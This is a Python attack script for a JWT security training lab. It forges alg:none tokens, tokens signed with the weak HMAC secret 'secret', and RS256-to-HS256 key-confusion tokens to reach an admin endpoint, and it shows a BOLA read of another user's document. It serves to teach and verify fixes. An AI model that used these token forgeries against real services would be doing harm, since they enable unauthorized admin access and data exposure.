"""
Attack driver for oauth-jwt-lab. Runs the JWT-abuse and authorization findings end to
end so you can watch each succeed against the vulnerable deployment and fail against the
fixed one.

  BOLA       - bob reads alice's document by its id
  alg:none   - forge an unsigned admin token, reach the admin-only function
  weak HMAC  - forge an admin token signed with the guessable secret "secret"
  confusion  - forge an admin token signed with the server's RSA public key (RS256->HS256)

    python demo/attack.py                                  # defaults to localhost:8000
    python demo/attack.py --base https://oauth-jwt-lab.192.168.50.10.nip.io
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import urllib.request

urllib.request.getproxies = lambda: {}


def b64u(b) -> str:
    if isinstance(b, str):
        b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def http(base, method, path, data=None, token=None):
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(base + path, data=body, method=method)
    if token:
        r.add_header("Authorization", "Bearer " + token)
    if data is not None:
        r.add_header("Content-Type", "application/json")
    try:
        resp = urllib.request.urlopen(r)
        return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def forge_none(payload):
    return f"{b64u(json.dumps({'alg':'none','typ':'JWT'}))}.{b64u(json.dumps(payload))}."


def forge_hs256(payload, secret):
    h, p = b64u(json.dumps({'alg': 'HS256', 'typ': 'JWT'})), b64u(json.dumps(payload))
    key = secret.encode() if isinstance(secret, str) else secret
    sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64u(sig)}"


def show(label, res):
    print(f"  {label}: HTTP {res[0]}  {res[1]}")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="http://localhost:8000")
    args = ap.parse_args()
    base = args.base.rstrip("/")

    mode = json.loads(http(base, "GET", "/health")[1])
    print(f"Target {base}  (secure_mode={mode.get('secure_mode')})\n")

    # login as the normal user bob
    _, body = http(base, "POST", "/login", {"username": "bob", "password": "bob"})
    bob = json.loads(body)["access_token"]

    print("[BOLA] bob reads alice's document d-1")
    show("GET /api/docs/d-1 as bob", http(base, "GET", "/api/docs/d-1", token=bob))

    admin = {"iss": "oauth-jwt-lab", "sub": "bob", "role": "admin"}

    print("\n[alg:none] forge an unsigned admin token")
    show("GET /api/admin/users", http(base, "GET", "/api/admin/users", token=forge_none(admin)))

    print("\n[weak HMAC] forge an admin token signed with 'secret'")
    show("GET /api/admin/users", http(base, "GET", "/api/admin/users", token=forge_hs256(admin, "secret")))

    print("\n[confusion] forge an admin token signed with the RSA public key")
    pub = http(base, "GET", "/public.pem")[1]
    show("GET /api/admin/users", http(base, "GET", "/api/admin/users", token=forge_hs256(admin, pub)))

    print("\nDone. Re-run against the SECURE_MODE=true deployment to see each attack fail.")


if __name__ == "__main__":
    sys.exit(main())
